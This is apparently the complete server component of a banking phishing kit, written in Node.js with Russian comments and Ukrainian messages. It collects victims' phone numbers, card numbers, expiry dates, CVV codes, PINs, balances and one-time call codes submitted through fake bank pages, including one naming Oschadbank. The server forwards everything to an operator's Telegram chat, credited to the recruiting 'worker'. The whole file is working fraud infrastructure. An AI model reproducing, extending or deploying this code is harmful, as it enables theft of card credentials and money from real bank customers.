const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Настройки Telegram
const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';
const CHAT_ID = 'ТВОЙ_CHAT_ID';
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// Сессии
const sessions = new Map();

// Отправка в Telegram
function sendToTelegram(message, sessionId, bankName) {
    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' })
        .then(() => console.log(`✅ Лог отправлен для сессии ${sessionId}`))
        .catch(err => console.error('❌ Ошибка отправки в Telegram:', err));
}

// API для отправки данных
app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, ...stepData } = req.body;

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };

    // 👈 сохраняем воркера из ссылки
    if (req.query.worker) {
        newData.worker = req.query.worker;
    }

    sessions.set(sessionId, newData);

    // Если пришёл код звонка
    if (newData.call_code_input) {
        let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
        message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;

        // 👈 добавляем воркера
        if (newData.worker) {
            message += `<b>👤 Worker:</b> ${newData.worker}\n`;
        }

        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    // Финальные данные
    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = `<b>Новий запис!</b>\n\n`;
        message += `<b>Назва банку:</b> ${newData.bankName}\n`;
        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
        message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
        if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
        message += `<b>Кількість переходів:</b> ${visitText}\n`;

        // 👈 добавляем воркера
        if (newData.worker) {
            message += `<b>👤 Worker:</b> ${newData.worker}\n`;
        }

        sendToTelegram(message, sessionId, newData.bankName);
    }

    res.status(200).json({ message: 'OK' });
});

// Генерация новой сессии
app.get('/api/new-session', (req, res) => {
    const sessionId = uuidv4();
    sessions.set(sessionId, { visitCount: 0 });
    res.json({ sessionId });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на http://localhost:${PORT}`);
});
